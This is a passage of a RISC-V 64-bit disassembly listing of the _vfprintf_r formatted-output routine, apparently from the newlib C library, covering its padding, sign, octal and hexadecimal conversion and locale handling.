   10eba:	7746                	ld	a4,112(sp)
   10ebc:	00e78c3b          	addw	s8,a5,a4
   10ec0:	67ea                	ld	a5,152(sp)
   10ec2:	fffc4993          	not	s3,s8
   10ec6:	43f9d993          	srai	s3,s3,0x3f
   10eca:	bff7f493          	andi	s1,a5,-1025
   10ece:	2481                	sext.w	s1,s1
   10ed0:	013c79b3          	and	s3,s8,s3
   10ed4:	1004e493          	ori	s1,s1,256
   10ed8:	2981                	sext.w	s3,s3
   10eda:	e882                	sd	zero,80(sp)
   10edc:	f082                	sd	zero,96(sp)
   10ede:	ec82                	sd	zero,88(sp)
   10ee0:	67ae                	ld	a5,200(sp)
   10ee2:	e399                	bnez	a5,10ee8 <_vfprintf_r+0x61a>
   10ee4:	17e0106f          	j	12062 <_vfprintf_r+0x1794>
   10ee8:	02d00793          	li	a5,45
   10eec:	0cf10fa3          	sb	a5,223(sp)
   10ef0:	4e81                	li	t4,0
   10ef2:	2985                	addiw	s3,s3,1
   10ef4:	b669                	j	10a7e <_vfprintf_r+0x1b0>
   10ef6:	0a10                	addi	a2,sp,272
   10ef8:	85d2                	mv	a1,s4
   10efa:	8556                	mv	a0,s5
   10efc:	fc76                	sd	t4,56(sp)
   10efe:	f87e                	sd	t6,48(sp)
   10f00:	e416                	sd	t0,8(sp)
   10f02:	78b070ef          	jal	ra,18e8c <__sprint_r>
   10f06:	56051463          	bnez	a0,1146e <_vfprintf_r+0xba0>
   10f0a:	7792                	ld	a5,288(sp)
   10f0c:	7ee2                	ld	t4,56(sp)
   10f0e:	7fc2                	ld	t6,48(sp)
   10f10:	62a2                	ld	t0,8(sp)
   10f12:	835e                	mv	t1,s7
   10f14:	be5d                	j	10aca <_vfprintf_r+0x1fc>
   10f16:	76e6                	ld	a3,120(sp)
   10f18:	7746                	ld	a4,112(sp)
   10f1a:	0341                	addi	t1,t1,16
   10f1c:	fed33823          	sd	a3,-16(t1)
   10f20:	11812683          	lw	a3,280(sp)
   10f24:	97ba                	add	a5,a5,a4
   10f26:	fee33c23          	sd	a4,-8(t1)
   10f2a:	2685                	addiw	a3,a3,1
   10f2c:	0006871b          	sext.w	a4,a3
   10f30:	10d12c23          	sw	a3,280(sp)
   10f34:	f23e                	sd	a5,288(sp)
   10f36:	469d                	li	a3,7
   10f38:	00e6de63          	bge	a3,a4,10f54 <_vfprintf_r+0x686>
   10f3c:	0a10                	addi	a2,sp,272
   10f3e:	85d2                	mv	a1,s4
   10f40:	8556                	mv	a0,s5
   10f42:	74b070ef          	jal	ra,18e8c <__sprint_r>
   10f46:	52051463          	bnez	a0,1146e <_vfprintf_r+0xba0>
   10f4a:	562e                	lw	a2,232(sp)
   10f4c:	7792                	ld	a5,288(sp)
   10f4e:	11812703          	lw	a4,280(sp)
   10f52:	835e                	mv	t1,s7
   10f54:	00065463          	bgez	a2,10f5c <_vfprintf_r+0x68e>
   10f58:	2a60106f          	j	121fe <_vfprintf_r+0x1930>
   10f5c:	7682                	ld	a3,32(sp)
   10f5e:	2705                	addiw	a4,a4,1
   10f60:	10e12c23          	sw	a4,280(sp)
   10f64:	97b6                	add	a5,a5,a3
   10f66:	00d33423          	sd	a3,8(t1)
   10f6a:	01933023          	sd	s9,0(t1)
   10f6e:	0007069b          	sext.w	a3,a4
   10f72:	f23e                	sd	a5,288(sp)
   10f74:	471d                	li	a4,7
   10f76:	bad75be3          	bge	a4,a3,10b2c <_vfprintf_r+0x25e>
   10f7a:	0a10                	addi	a2,sp,272
   10f7c:	85d2                	mv	a1,s4
   10f7e:	8556                	mv	a0,s5
   10f80:	70d070ef          	jal	ra,18e8c <__sprint_r>
   10f84:	4e051563          	bnez	a0,1146e <_vfprintf_r+0xba0>
   10f88:	7792                	ld	a5,288(sp)
   10f8a:	835e                	mv	t1,s7
   10f8c:	b64d                	j	10b2e <_vfprintf_r+0x260>
   10f8e:	0104f793          	andi	a5,s1,16
   10f92:	0e0799e3          	bnez	a5,11884 <_vfprintf_r+0xfb6>
   10f96:	66c2                	ld	a3,16(sp)
   10f98:	0404f793          	andi	a5,s1,64
   10f9c:	0006a983          	lw	s3,0(a3)
   10fa0:	44078ae3          	beqz	a5,11bf4 <_vfprintf_r+0x1326>
   10fa4:	19c2                	slli	s3,s3,0x30
   10fa6:	0309d993          	srli	s3,s3,0x30
   10faa:	b1d1                	j	10c6e <_vfprintf_r+0x3a0>
   10fac:	0104f793          	andi	a5,s1,16
   10fb0:	0c0795e3          	bnez	a5,1187a <_vfprintf_r+0xfac>
   10fb4:	0404f793          	andi	a5,s1,64
   10fb8:	40078de3          	beqz	a5,11bd2 <_vfprintf_r+0x1304>
   10fbc:	67c2                	ld	a5,16(sp)
   10fbe:	00079983          	lh	s3,0(a5)
   10fc2:	87ce                	mv	a5,s3
   10fc4:	c407d8e3          	bgez	a5,10c14 <_vfprintf_r+0x346>
   10fc8:	02d00793          	li	a5,45
   10fcc:	0cf10fa3          	sb	a5,223(sp)
   10fd0:	e83a                	sd	a4,16(sp)
   10fd2:	577d                	li	a4,-1
   10fd4:	413009b3          	neg	s3,s3
   10fd8:	8826                	mv	a6,s1
   10fda:	4785                	li	a5,1
   10fdc:	caee94e3          	bne	t4,a4,10c84 <_vfprintf_r+0x3b6>
   10fe0:	4705                	li	a4,1
   10fe2:	56e78463          	beq	a5,a4,1154a <_vfprintf_r+0xc7c>
   10fe6:	4709                	li	a4,2
   10fe8:	28e78263          	beq	a5,a4,1126c <_vfprintf_r+0x99e>
   10fec:	18c10c13          	addi	s8,sp,396
   10ff0:	8ce2                	mv	s9,s8
   10ff2:	0079f793          	andi	a5,s3,7
   10ff6:	03078793          	addi	a5,a5,48
   10ffa:	fefc8fa3          	sb	a5,-1(s9)
   10ffe:	0039d993          	srli	s3,s3,0x3
   11002:	8766                	mv	a4,s9
   11004:	1cfd                	addi	s9,s9,-1
   11006:	fe0996e3          	bnez	s3,10ff2 <_vfprintf_r+0x724>
   1100a:	00187693          	andi	a3,a6,1
   1100e:	26068f63          	beqz	a3,1128c <_vfprintf_r+0x9be>
   11012:	03000693          	li	a3,48
   11016:	26d78b63          	beq	a5,a3,1128c <_vfprintf_r+0x9be>
   1101a:	1779                	addi	a4,a4,-2
   1101c:	fedc8fa3          	sb	a3,-1(s9)
   11020:	40ec0c3b          	subw	s8,s8,a4
   11024:	84c2                	mv	s1,a6
   11026:	8cba                	mv	s9,a4
   11028:	b139                	j	10c36 <_vfprintf_r+0x368>
   1102a:	8556                	mv	a0,s5
   1102c:	33f010ef          	jal	ra,12b6a <__sinit>
   11030:	b8fd                	j	1092e <_vfprintf_r+0x60>
   11032:	67c2                	ld	a5,16(sp)
   11034:	0c010fa3          	sb	zero,223(sp)
   11038:	0007bc83          	ld	s9,0(a5)
   1103c:	00878693          	addi	a3,a5,8
   11040:	1c0c85e3          	beqz	s9,11a0a <_vfprintf_r+0x113c>
   11044:	57fd                	li	a5,-1
   11046:	34fe82e3          	beq	t4,a5,11b8a <_vfprintf_r+0x12bc>
   1104a:	8676                	mv	a2,t4
   1104c:	4581                	li	a1,0
   1104e:	8566                	mv	a0,s9
   11050:	f836                	sd	a3,48(sp)
   11052:	e81a                	sd	t1,16(sp)
   11054:	e476                	sd	t4,8(sp)
   11056:	3ab040ef          	jal	ra,15c00 <memchr>
   1105a:	ec2a                	sd	a0,24(sp)
   1105c:	6ea2                	ld	t4,8(sp)
   1105e:	6342                	ld	t1,16(sp)
   11060:	76c2                	ld	a3,48(sp)
   11062:	e119                	bnez	a0,11068 <_vfprintf_r+0x79a>
   11064:	1120106f          	j	12176 <_vfprintf_r+0x18a8>
   11068:	67e2                	ld	a5,24(sp)
   1106a:	e836                	sd	a3,16(sp)
   1106c:	ec02                	sd	zero,24(sp)
   1106e:	41978c3b          	subw	s8,a5,s9
   11072:	fffc4993          	not	s3,s8
   11076:	0df14783          	lbu	a5,223(sp)
   1107a:	43f9d993          	srai	s3,s3,0x3f
   1107e:	013c79b3          	and	s3,s8,s3
   11082:	e882                	sd	zero,80(sp)
   11084:	f082                	sd	zero,96(sp)
   11086:	ec82                	sd	zero,88(sp)
   11088:	2981                	sext.w	s3,s3
   1108a:	4e81                	li	t4,0
   1108c:	bc0793e3          	bnez	a5,10c52 <_vfprintf_r+0x384>
   11090:	b2fd                	j	10a7e <_vfprintf_r+0x1b0>
   11092:	6742                	ld	a4,16(sp)
   11094:	0c010fa3          	sb	zero,223(sp)
   11098:	4985                	li	s3,1
   1109a:	431c                	lw	a5,0(a4)
   1109c:	0721                	addi	a4,a4,8
   1109e:	e83a                	sd	a4,16(sp)
   110a0:	12f10423          	sb	a5,296(sp)
   110a4:	4c05                	li	s8,1
   110a6:	12810c93          	addi	s9,sp,296
   110aa:	b2e9                	j	10a74 <_vfprintf_r+0x1a6>
   110ac:	00044f03          	lbu	t5,0(s0)
   110b0:	0044e493          	ori	s1,s1,4
   110b4:	2481                	sext.w	s1,s1
   110b6:	b2b1                	j	10a02 <_vfprintf_r+0x134>
   110b8:	02b00793          	li	a5,43
   110bc:	00044f03          	lbu	t5,0(s0)
   110c0:	0cf10fa3          	sb	a5,223(sp)
   110c4:	ba3d                	j	10a02 <_vfprintf_r+0x134>
   110c6:	0804e493          	ori	s1,s1,128
   110ca:	00044f03          	lbu	t5,0(s0)
   110ce:	2481                	sext.w	s1,s1
   110d0:	ba0d                	j	10a02 <_vfprintf_r+0x134>
   110d2:	00044703          	lbu	a4,0(s0)
   110d6:	00140793          	addi	a5,s0,1
   110da:	00070d9b          	sext.w	s11,a4
   110de:	00ec1463          	bne	s8,a4,110e6 <_vfprintf_r+0x818>
   110e2:	3d20106f          	j	124b4 <_vfprintf_r+0x1be6>
   110e6:	fd07071b          	addiw	a4,a4,-48
   110ea:	843e                	mv	s0,a5
   110ec:	4e81                	li	t4,0
   110ee:	90e9efe3          	bltu	s3,a4,10a0c <_vfprintf_r+0x13e>
   110f2:	00044d83          	lbu	s11,0(s0)
   110f6:	002e979b          	slliw	a5,t4,0x2
   110fa:	01d78ebb          	addw	t4,a5,t4
   110fe:	001e9e9b          	slliw	t4,t4,0x1
   11102:	00ee8ebb          	addw	t4,t4,a4
   11106:	fd0d871b          	addiw	a4,s11,-48
   1110a:	0405                	addi	s0,s0,1
   1110c:	fee9f3e3          	bgeu	s3,a4,110f2 <_vfprintf_r+0x824>
   11110:	b8f5                	j	10a0c <_vfprintf_r+0x13e>
   11112:	67c2                	ld	a5,16(sp)
   11114:	00044f03          	lbu	t5,0(s0)
   11118:	0007ab03          	lw	s6,0(a5)
   1111c:	07a1                	addi	a5,a5,8
   1111e:	e83e                	sd	a5,16(sp)
   11120:	8e0b51e3          	bgez	s6,10a02 <_vfprintf_r+0x134>
   11124:	41600b3b          	negw	s6,s6
   11128:	b761                	j	110b0 <_vfprintf_r+0x7e2>
   1112a:	8556                	mv	a0,s5
   1112c:	ec1a                	sd	t1,24(sp)
   1112e:	e476                	sd	t4,8(sp)
   11130:	2a2040ef          	jal	ra,153d2 <_localeconv_r>
   11134:	651c                	ld	a5,8(a0)
   11136:	853e                	mv	a0,a5
   11138:	e93e                	sd	a5,144(sp)
   1113a:	f00ff0ef          	jal	ra,1083a <strlen>
   1113e:	87aa                	mv	a5,a0
   11140:	8556                	mv	a0,s5
   11142:	8dbe                	mv	s11,a5
   11144:	e53e                	sd	a5,136(sp)
   11146:	28c040ef          	jal	ra,153d2 <_localeconv_r>
   1114a:	6918                	ld	a4,16(a0)
   1114c:	6ea2                	ld	t4,8(sp)
   1114e:	6362                	ld	t1,24(sp)
   11150:	f4ba                	sd	a4,104(sp)
   11152:	00044f03          	lbu	t5,0(s0)
   11156:	8a0d86e3          	beqz	s11,10a02 <_vfprintf_r+0x134>
   1115a:	8a0704e3          	beqz	a4,10a02 <_vfprintf_r+0x134>
   1115e:	00074783          	lbu	a5,0(a4)
   11162:	8a0780e3          	beqz	a5,10a02 <_vfprintf_r+0x134>
   11166:	4004e493          	ori	s1,s1,1024
   1116a:	2481                	sext.w	s1,s1
   1116c:	b859                	j	10a02 <_vfprintf_r+0x134>
   1116e:	0014e493          	ori	s1,s1,1
   11172:	00044f03          	lbu	t5,0(s0)
   11176:	2481                	sext.w	s1,s1
   11178:	b069                	j	10a02 <_vfprintf_r+0x134>
   1117a:	0df14783          	lbu	a5,223(sp)
   1117e:	00044f03          	lbu	t5,0(s0)
   11182:	880790e3          	bnez	a5,10a02 <_vfprintf_r+0x134>
   11186:	02000793          	li	a5,32
   1118a:	0cf10fa3          	sb	a5,223(sp)
   1118e:	b895                	j	10a02 <_vfprintf_r+0x134>
   11190:	0084e493          	ori	s1,s1,8
   11194:	00044f03          	lbu	t5,0(s0)
   11198:	2481                	sext.w	s1,s1
   1119a:	b0a5                	j	10a02 <_vfprintf_r+0x134>
   1119c:	0104e493          	ori	s1,s1,16
   111a0:	0004881b          	sext.w	a6,s1
   111a4:	66c2                	ld	a3,16(sp)
   111a6:	02087793          	andi	a5,a6,32
   111aa:	00868713          	addi	a4,a3,8
   111ae:	68078463          	beqz	a5,11836 <_vfprintf_r+0xf68>
   111b2:	0006b983          	ld	s3,0(a3)
   111b6:	4785                	li	a5,1
   111b8:	e83a                	sd	a4,16(sp)
   111ba:	b4c1                	j	10c7a <_vfprintf_r+0x3ac>
   111bc:	0204e493          	ori	s1,s1,32
   111c0:	00044f03          	lbu	t5,0(s0)
   111c4:	2481                	sext.w	s1,s1
   111c6:	83dff06f          	j	10a02 <_vfprintf_r+0x134>
   111ca:	6742                	ld	a4,16(sp)
   111cc:	77e1                	lui	a5,0xffff8
   111ce:	8307c793          	xori	a5,a5,-2000
   111d2:	0ef11023          	sh	a5,224(sp)
   111d6:	00870793          	addi	a5,a4,8
   111da:	0024e493          	ori	s1,s1,2
   111de:	e83e                	sd	a5,16(sp)
   111e0:	0000b797          	auipc	a5,0xb
   111e4:	49878793          	addi	a5,a5,1176 # 1c678 <__clzdi2+0x19e>
   111e8:	f43e                	sd	a5,40(sp)
   111ea:	00073983          	ld	s3,0(a4)
   111ee:	0004881b          	sext.w	a6,s1
   111f2:	4789                	li	a5,2
   111f4:	07800d93          	li	s11,120
   111f8:	b449                	j	10c7a <_vfprintf_r+0x3ac>
   111fa:	66c2                	ld	a3,16(sp)
   111fc:	0204f793          	andi	a5,s1,32
   11200:	6298                	ld	a4,0(a3)
   11202:	06a1                	addi	a3,a3,8
   11204:	e836                	sd	a3,16(sp)
   11206:	64079e63          	bnez	a5,11862 <_vfprintf_r+0xf94>
   1120a:	0104f793          	andi	a5,s1,16
   1120e:	64079a63          	bnez	a5,11862 <_vfprintf_r+0xf94>
   11212:	0404f793          	andi	a5,s1,64
   11216:	3e0799e3          	bnez	a5,11e08 <_vfprintf_r+0x153a>
   1121a:	2004f493          	andi	s1,s1,512
   1121e:	6782                	ld	a5,0(sp)
   11220:	e099                	bnez	s1,11226 <_vfprintf_r+0x958>
   11222:	1280106f          	j	1234a <_vfprintf_r+0x1a7c>
   11226:	00f70023          	sb	a5,0(a4)
   1122a:	8ca2                	mv	s9,s0
   1122c:	ba15                	j	10b60 <_vfprintf_r+0x292>
   1122e:	00044f03          	lbu	t5,0(s0)
   11232:	06c00793          	li	a5,108
   11236:	7aff0263          	beq	t5,a5,119da <_vfprintf_r+0x110c>
   1123a:	0104e493          	ori	s1,s1,16
   1123e:	2481                	sext.w	s1,s1
   11240:	fc2ff06f          	j	10a02 <_vfprintf_r+0x134>
   11244:	00044f03          	lbu	t5,0(s0)
   11248:	06800793          	li	a5,104
   1124c:	76ff0f63          	beq	t5,a5,119ca <_vfprintf_r+0x10fc>
   11250:	0404e493          	ori	s1,s1,64
   11254:	2481                	sext.w	s1,s1
   11256:	facff06f          	j	10a02 <_vfprintf_r+0x134>
   1125a:	4705                	li	a4,1
   1125c:	00e79463          	bne	a5,a4,11264 <_vfprintf_r+0x996>
   11260:	0220106f          	j	12282 <_vfprintf_r+0x19b4>
   11264:	4709                	li	a4,2
   11266:	8826                	mv	a6,s1
   11268:	d8e792e3          	bne	a5,a4,10fec <_vfprintf_r+0x71e>
   1126c:	18c10c13          	addi	s8,sp,396
   11270:	8ce2                	mv	s9,s8
   11272:	7722                	ld	a4,40(sp)
   11274:	00f9f793          	andi	a5,s3,15
   11278:	1cfd                	addi	s9,s9,-1
   1127a:	97ba                	add	a5,a5,a4
   1127c:	0007c783          	lbu	a5,0(a5)
   11280:	0049d993          	srli	s3,s3,0x4
   11284:	00fc8023          	sb	a5,0(s9)
   11288:	fe0995e3          	bnez	s3,11272 <_vfprintf_r+0x9a4>
   1128c:	419c0c3b          	subw	s8,s8,s9
   11290:	84c2                	mv	s1,a6
   11292:	b255                	j	10c36 <_vfprintf_r+0x368>
   11294:	06500713          	li	a4,101
   11298:	1fb75463          	bge	a4,s11,11480 <_vfprintf_r+0xbb2>
   1129c:	6512                	ld	a0,256(sp)
   1129e:	65b2                	ld	a1,264(sp)
   112a0:	4601                	li	a2,0
   112a2:	4681                	li	a3,0
   112a4:	f83e                	sd	a5,48(sp)
   112a6:	e41a                	sd	t1,8(sp)
   112a8:	65d090ef          	jal	ra,1b104 <__eqtf2>
   112ac:	6322                	ld	t1,8(sp)
   112ae:	77c2                	ld	a5,48(sp)
   112b0:	3e051b63          	bnez	a0,116a6 <_vfprintf_r+0xdd8>
   112b4:	11812703          	lw	a4,280(sp)
   112b8:	0000b697          	auipc	a3,0xb
   112bc:	3e068693          	addi	a3,a3,992 # 1c698 <__clzdi2+0x1be>
   112c0:	00d33023          	sd	a3,0(t1)
   112c4:	2705                	addiw	a4,a4,1
   112c6:	4685                	li	a3,1
   112c8:	0785                	addi	a5,a5,1
   112ca:	00d33423          	sd	a3,8(t1)
   112ce:	10e12c23          	sw	a4,280(sp)
   112d2:	0007069b          	sext.w	a3,a4
   112d6:	f23e                	sd	a5,288(sp)
   112d8:	471d                	li	a4,7
   112da:	0341                	addi	t1,t1,16
   112dc:	04d742e3          	blt	a4,a3,11b20 <_vfprintf_r+0x1252>
   112e0:	572e                	lw	a4,232(sp)
   112e2:	7682                	ld	a3,32(sp)
   112e4:	56d75a63          	bge	a4,a3,11858 <_vfprintf_r+0xf8a>
   112e8:	7766                	ld	a4,120(sp)
   112ea:	76c6                	ld	a3,112(sp)
   112ec:	0341                	addi	t1,t1,16
   112ee:	fee33823          	sd	a4,-16(t1)
   112f2:	11812703          	lw	a4,280(sp)
   112f6:	97b6                	add	a5,a5,a3
   112f8:	fed33c23          	sd	a3,-8(t1)
   112fc:	2705                	addiw	a4,a4,1
   112fe:	0007069b          	sext.w	a3,a4
   11302:	10e12c23          	sw	a4,280(sp)
   11306:	f23e                	sd	a5,288(sp)
   11308:	471d                	li	a4,7
   1130a:	6ed74063          	blt	a4,a3,119ea <_vfprintf_r+0x111c>
   1130e:	7702                	ld	a4,32(sp)
   11310:	fff70c1b          	addiw	s8,a4,-1
   11314:	81805de3          	blez	s8,10b2e <_vfprintf_r+0x260>
   11318:	11812703          	lw	a4,280(sp)
   1131c:	018d5de3          	bge	s10,s8,11b36 <_vfprintf_r+0x1268>
   11320:	4c9d                	li	s9,7
   11322:	a021                	j	1132a <_vfprintf_r+0xa5c>
   11324:	3c41                	addiw	s8,s8,-16
   11326:	018d58e3          	bge	s10,s8,11b36 <_vfprintf_r+0x1268>
   1132a:	2705                	addiw	a4,a4,1
   1132c:	07c1                	addi	a5,a5,16
   1132e:	01233023          	sd	s2,0(t1)
   11332:	01a33423          	sd	s10,8(t1)
   11336:	f23e                	sd	a5,288(sp)
   11338:	10e12c23          	sw	a4,280(sp)
   1133c:	0341                	addi	t1,t1,16
   1133e:	feecd3e3          	bge	s9,a4,11324 <_vfprintf_r+0xa56>
   11342:	0a10                	addi	a2,sp,272
   11344:	85d2                	mv	a1,s4
   11346:	8556                	mv	a0,s5
   11348:	345070ef          	jal	ra,18e8c <__sprint_r>
   1134c:	12051163          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11350:	7792                	ld	a5,288(sp)
   11352:	11812703          	lw	a4,280(sp)
   11356:	835e                	mv	t1,s7
   11358:	b7f1                	j	11324 <_vfprintf_r+0xa56>
   1135a:	413b06bb          	subw	a3,s6,s3
   1135e:	f8d05f63          	blez	a3,10afc <_vfprintf_r+0x22e>
   11362:	11812703          	lw	a4,280(sp)
   11366:	04dd5563          	bge	s10,a3,113b0 <_vfprintf_r+0xae2>
   1136a:	489d                	li	a7,7
   1136c:	a021                	j	11374 <_vfprintf_r+0xaa6>
   1136e:	36c1                	addiw	a3,a3,-16
   11370:	04dd5063          	bge	s10,a3,113b0 <_vfprintf_r+0xae2>
   11374:	2705                	addiw	a4,a4,1
   11376:	07c1                	addi	a5,a5,16
   11378:	01233023          	sd	s2,0(t1)
   1137c:	01a33423          	sd	s10,8(t1)
   11380:	f23e                	sd	a5,288(sp)
   11382:	10e12c23          	sw	a4,280(sp)
   11386:	0341                	addi	t1,t1,16
   11388:	fee8d3e3          	bge	a7,a4,1136e <_vfprintf_r+0xaa0>
   1138c:	0a10                	addi	a2,sp,272
   1138e:	85d2                	mv	a1,s4
   11390:	8556                	mv	a0,s5
   11392:	f836                	sd	a3,48(sp)
   11394:	e476                	sd	t4,8(sp)
   11396:	2f7070ef          	jal	ra,18e8c <__sprint_r>
   1139a:	e971                	bnez	a0,1146e <_vfprintf_r+0xba0>
   1139c:	76c2                	ld	a3,48(sp)
   1139e:	7792                	ld	a5,288(sp)
   113a0:	11812703          	lw	a4,280(sp)
   113a4:	36c1                	addiw	a3,a3,-16
   113a6:	6ea2                	ld	t4,8(sp)
   113a8:	835e                	mv	t1,s7
   113aa:	489d                	li	a7,7
   113ac:	fcdd44e3          	blt	s10,a3,11374 <_vfprintf_r+0xaa6>
   113b0:	2705                	addiw	a4,a4,1
   113b2:	97b6                	add	a5,a5,a3
   113b4:	00d33423          	sd	a3,8(t1)
   113b8:	01233023          	sd	s2,0(t1)
   113bc:	0007069b          	sext.w	a3,a4
   113c0:	10e12c23          	sw	a4,280(sp)
   113c4:	f23e                	sd	a5,288(sp)
   113c6:	471d                	li	a4,7
   113c8:	0341                	addi	t1,t1,16
   113ca:	f2d75963          	bge	a4,a3,10afc <_vfprintf_r+0x22e>
   113ce:	0a10                	addi	a2,sp,272
   113d0:	85d2                	mv	a1,s4
   113d2:	8556                	mv	a0,s5
   113d4:	e476                	sd	t4,8(sp)
   113d6:	2b7070ef          	jal	ra,18e8c <__sprint_r>
   113da:	e951                	bnez	a0,1146e <_vfprintf_r+0xba0>
   113dc:	7792                	ld	a5,288(sp)
   113de:	6ea2                	ld	t4,8(sp)
   113e0:	835e                	mv	t1,s7
   113e2:	f1aff06f          	j	10afc <_vfprintf_r+0x22e>
   113e6:	11812703          	lw	a4,280(sp)
   113ea:	05dd5363          	bge	s10,t4,11430 <_vfprintf_r+0xb62>
   113ee:	489d                	li	a7,7
   113f0:	a021                	j	113f8 <_vfprintf_r+0xb2a>
   113f2:	3ec1                	addiw	t4,t4,-16
   113f4:	03dd5e63          	bge	s10,t4,11430 <_vfprintf_r+0xb62>
   113f8:	2705                	addiw	a4,a4,1
   113fa:	07c1                	addi	a5,a5,16
   113fc:	01233023          	sd	s2,0(t1)
   11400:	01a33423          	sd	s10,8(t1)
   11404:	f23e                	sd	a5,288(sp)
   11406:	10e12c23          	sw	a4,280(sp)
   1140a:	0341                	addi	t1,t1,16
   1140c:	fee8d3e3          	bge	a7,a4,113f2 <_vfprintf_r+0xb24>
   11410:	0a10                	addi	a2,sp,272
   11412:	85d2                	mv	a1,s4
   11414:	8556                	mv	a0,s5
   11416:	e476                	sd	t4,8(sp)
   11418:	275070ef          	jal	ra,18e8c <__sprint_r>
   1141c:	e929                	bnez	a0,1146e <_vfprintf_r+0xba0>
   1141e:	6ea2                	ld	t4,8(sp)
   11420:	7792                	ld	a5,288(sp)
   11422:	11812703          	lw	a4,280(sp)
   11426:	3ec1                	addiw	t4,t4,-16
   11428:	835e                	mv	t1,s7
   1142a:	489d                	li	a7,7
   1142c:	fddd46e3          	blt	s10,t4,113f8 <_vfprintf_r+0xb2a>
   11430:	0017069b          	addiw	a3,a4,1
   11434:	97f6                	add	a5,a5,t4
   11436:	01233023          	sd	s2,0(t1)
   1143a:	01d33423          	sd	t4,8(t1)
   1143e:	f23e                	sd	a5,288(sp)
   11440:	10d12c23          	sw	a3,280(sp)
   11444:	471d                	li	a4,7
   11446:	0341                	addi	t1,t1,16
   11448:	ead75e63          	bge	a4,a3,10b04 <_vfprintf_r+0x236>
   1144c:	0a10                	addi	a2,sp,272
   1144e:	85d2                	mv	a1,s4
   11450:	8556                	mv	a0,s5
   11452:	23b070ef          	jal	ra,18e8c <__sprint_r>
   11456:	ed01                	bnez	a0,1146e <_vfprintf_r+0xba0>
   11458:	7792                	ld	a5,288(sp)
   1145a:	835e                	mv	t1,s7
   1145c:	ea8ff06f          	j	10b04 <_vfprintf_r+0x236>
   11460:	0a10                	addi	a2,sp,272
   11462:	85d2                	mv	a1,s4
   11464:	8556                	mv	a0,s5
   11466:	227070ef          	jal	ra,18e8c <__sprint_r>
   1146a:	ee050163          	beqz	a0,10b4c <_vfprintf_r+0x27e>
   1146e:	67e2                	ld	a5,24(sp)
   11470:	f0078063          	beqz	a5,10b70 <_vfprintf_r+0x2a2>
   11474:	85be                	mv	a1,a5
   11476:	8556                	mv	a0,s5
   11478:	025010ef          	jal	ra,12c9c <_free_r>
   1147c:	ef4ff06f          	j	10b70 <_vfprintf_r+0x2a2>
   11480:	11812603          	lw	a2,280(sp)
   11484:	00178d93          	addi	s11,a5,1
   11488:	7782                	ld	a5,32(sp)
   1148a:	0016071b          	addiw	a4,a2,1
   1148e:	4585                	li	a1,1
   11490:	01933023          	sd	s9,0(t1)
   11494:	86ba                	mv	a3,a4
   11496:	01030c13          	addi	s8,t1,16
   1149a:	32f5d863          	bge	a1,a5,117ca <_vfprintf_r+0xefc>
   1149e:	4605                	li	a2,1
   114a0:	10d12c23          	sw	a3,280(sp)
   114a4:	00c33423          	sd	a2,8(t1)
   114a8:	f26e                	sd	s11,288(sp)
   114aa:	469d                	li	a3,7
   114ac:	5ce6c463          	blt	a3,a4,11a74 <_vfprintf_r+0x11a6>
   114b0:	77c6                	ld	a5,112(sp)
   114b2:	0017069b          	addiw	a3,a4,1
   114b6:	7766                	ld	a4,120(sp)
   114b8:	9dbe                	add	s11,s11,a5
   114ba:	00fc3423          	sd	a5,8(s8)
   114be:	00ec3023          	sd	a4,0(s8)
   114c2:	10d12c23          	sw	a3,280(sp)
   114c6:	0006871b          	sext.w	a4,a3
   114ca:	f26e                	sd	s11,288(sp)
   114cc:	469d                	li	a3,7
   114ce:	0c41                	addi	s8,s8,16
   114d0:	5ae6ce63          	blt	a3,a4,11a8c <_vfprintf_r+0x11be>
   114d4:	6512                	ld	a0,256(sp)
   114d6:	65b2                	ld	a1,264(sp)
   114d8:	0017089b          	addiw	a7,a4,1
   114dc:	4601                	li	a2,0
   114de:	4681                	li	a3,0
   114e0:	e446                	sd	a7,8(sp)
   114e2:	f83a                	sd	a4,48(sp)
   114e4:	421090ef          	jal	ra,1b104 <__eqtf2>
   114e8:	68a2                	ld	a7,8(sp)
   114ea:	7782                	ld	a5,32(sp)
   114ec:	010c0313          	addi	t1,s8,16
   114f0:	0008861b          	sext.w	a2,a7
   114f4:	fff7869b          	addiw	a3,a5,-1
   114f8:	2e050963          	beqz	a0,117ea <_vfprintf_r+0xf1c>
   114fc:	9db6                	add	s11,s11,a3
   114fe:	001c8813          	addi	a6,s9,1
   11502:	00dc3423          	sd	a3,8(s8)
   11506:	010c3023          	sd	a6,0(s8)
   1150a:	f26e                	sd	s11,288(sp)
   1150c:	11112c23          	sw	a7,280(sp)
   11510:	469d                	li	a3,7
   11512:	44c6c763          	blt	a3,a2,11960 <_vfprintf_r+0x1092>
   11516:	7742                	ld	a4,48(sp)
   11518:	020c0693          	addi	a3,s8,32
   1151c:	8c1a                	mv	s8,t1
   1151e:	0027061b          	addiw	a2,a4,2
   11522:	8336                	mv	t1,a3
   11524:	668a                	ld	a3,128(sp)
   11526:	1998                	addi	a4,sp,240
   11528:	00ec3023          	sd	a4,0(s8)
   1152c:	00dd87b3          	add	a5,s11,a3
   11530:	00dc3423          	sd	a3,8(s8)
   11534:	f23e                	sd	a5,288(sp)
   11536:	10c12c23          	sw	a2,280(sp)
   1153a:	471d                	li	a4,7
   1153c:	dec75963          	bge	a4,a2,10b2e <_vfprintf_r+0x260>
   11540:	bc2d                	j	10f7a <_vfprintf_r+0x6ac>
   11542:	4705                	li	a4,1
   11544:	8826                	mv	a6,s1
   11546:	aae790e3          	bne	a5,a4,10fe6 <_vfprintf_r+0x718>
   1154a:	47a5                	li	a5,9
   1154c:	3737e163          	bltu	a5,s3,118ae <_vfprintf_r+0xfe0>
   11550:	0309899b          	addiw	s3,s3,48
   11554:	193105a3          	sb	s3,395(sp)
   11558:	84c2                	mv	s1,a6
   1155a:	4c05                	li	s8,1
   1155c:	18b10c93          	addi	s9,sp,395
   11560:	ed6ff06f          	j	10c36 <_vfprintf_r+0x368>
   11564:	11812703          	lw	a4,280(sp)
   11568:	0000b897          	auipc	a7,0xb
   1156c:	2a888893          	addi	a7,a7,680 # 1c810 <blanks.4520>
   11570:	439d                	li	t2,7
   11572:	00dd4663          	blt	s10,a3,1157e <_vfprintf_r+0xcb0>
   11576:	a889                	j	115c8 <_vfprintf_r+0xcfa>
   11578:	36c1                	addiw	a3,a3,-16
   1157a:	04dd5763          	bge	s10,a3,115c8 <_vfprintf_r+0xcfa>
   1157e:	2705                	addiw	a4,a4,1
   11580:	07c1                	addi	a5,a5,16
   11582:	01133023          	sd	a7,0(t1)
   11586:	01a33423          	sd	s10,8(t1)
